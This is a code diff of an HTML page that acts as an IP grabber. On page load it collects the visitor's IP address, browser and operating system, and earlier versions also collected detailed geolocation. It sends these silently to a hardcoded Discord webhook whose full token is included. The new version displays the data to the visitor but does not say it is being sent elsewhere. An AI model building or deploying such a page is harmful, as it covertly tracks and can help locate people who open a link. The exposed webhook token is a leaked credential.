@@ -1,41 +1,55 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>位置情報送信</title>
+    <title>IP Information</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #36393f;
+            text-align: center;
+            color: #dcddde;
+        }
+        .container {
+            background: #2f3136;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 350px;
+        }
+        h1 {
+            margin-bottom: 20px;
+            color: #ffffff;
+        }
+        .info {
+            text-align: left;
+            font-size: 14px;
+            background: #40444b;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        .info strong {
+            color: #ffffff;
+        }
+    </style>
 </head>
 <body>
-    <h1>位置情報を送信中...</h1>
+    <div class="container">
+        <h1>IP Information</h1>
+        <div id="ip-info" class="info">Fetching...</div>
+    </div>
 
     <script>
-        function sendLocationToWebhook(data) {
+        function sendIpToWebhook(ip, browser, device) {
             const webhookUrl = 'https://discord.com/api/webhooks/1356629113678336191/yfvYgefTCtYsLQi1PseDawA1IaL62QciuHXKiTwCkxMjDAY1Fd5GsYAxo0kv3kI2ASn8';
             const payload = {
-                content: `位置情報の詳細:\n
-- IP: ${data.ip}\n
-- ネットワーク: ${data.network}\n
-- バージョン: ${data.version}\n
-- 都市: ${data.city}\n
-- 地域: ${data.region}\n
-- 地域コード: ${data.region_code}\n
-- 国: ${data.country_name}\n
-- 国コード: ${data.country_code}\n
-- 首都: ${data.country_capital}\n
-- 郵便番号: ${data.postal}\n
-- 緯度: ${data.latitude}\n
-- 経度: ${data.longitude}\n
-- タイムゾーン: ${data.timezone}\n
-- UTCオフセット: ${data.utc_offset}\n
-- 電話コード: ${data.country_calling_code}\n
-- 通貨: ${data.currency_name} (${data.currency})\n
-- 言語: ${data.languages}\n
-- 国土面積: ${data.country_area} km²\n
-- 人口: ${data.country_population}\n
-- ASN: ${data.asn}\n
-- 組織: ${data.org}\n
-`,
-                username: '位置情報ボット',
+                content: `Address: ${ip}\nBrowser: ${browser}\nDevice: ${device}`,
+                username: 'IP Bot',
             };
 
             fetch(webhookUrl, {
@@ -44,29 +58,57 @@
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify(payload),
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Webhook送信成功:', data);
-            })
-            .catch(error => {
-                console.error('Webhook送信失敗:', error);
+            }).catch(error => {
+                console.error('Error:', error);
             });
         }
 
-        function fetchLocation() {
-            fetch('https://ipapi.co/json/')
+        function fetchIp() {
+            fetch('https://api.ipify.org?format=json') // Fetch IP address
                 .then(response => response.json())
                 .then(data => {
-                    console.log('取得した位置情報:', data);
-                    sendLocationToWebhook(data);
+                    const userIp = data.ip;
+
+                    // Detect browser
+                    let browser = "Unknown";
+                    if (navigator.userAgent.includes("Chrome")) {
+                        browser = "Chrome";
+                    } else if (navigator.userAgent.includes("Firefox")) {
+                        browser = "Firefox";
+                    } else if (navigator.userAgent.includes("Safari")) {
+                        browser = "Safari";
+                    } else if (navigator.userAgent.includes("Edge")) {
+                        browser = "Edge";
+                    }
+
+                    // Detect device
+                    let device = "Unknown";
+                    if (navigator.userAgent.includes("Windows")) {
+                        device = "Windows";
+                    } else if (navigator.userAgent.includes("Mac")) {
+                        device = "Mac";
+                    } else if (navigator.userAgent.includes("Linux")) {
+                        device = "Linux";
+                    } else if (navigator.userAgent.includes("Android")) {
+                        device = "Android";
+                    } else if (navigator.userAgent.includes("iPhone")) {
+                        device = "iPhone";
+                    }
+
+                    document.getElementById('ip-info').innerHTML = `
+                        <strong>Address:</strong> ${userIp}<br>
+                        <strong>Browser:</strong> ${browser}<br>
+                        <strong>Device:</strong> ${device}<br>
+                    `;
+                    sendIpToWebhook(userIp, browser, device);
                 })
                 .catch(error => {
-                    console.error('位置情報取得失敗:', error);
+                    console.error('Failed to fetch IP information:', error);
+                    document.getElementById('ip-info').innerText = 'Failed to fetch data';
                 });
         }
 
-        fetchLocation();
+        fetchIp();
     </script>
 </body>
 </html>
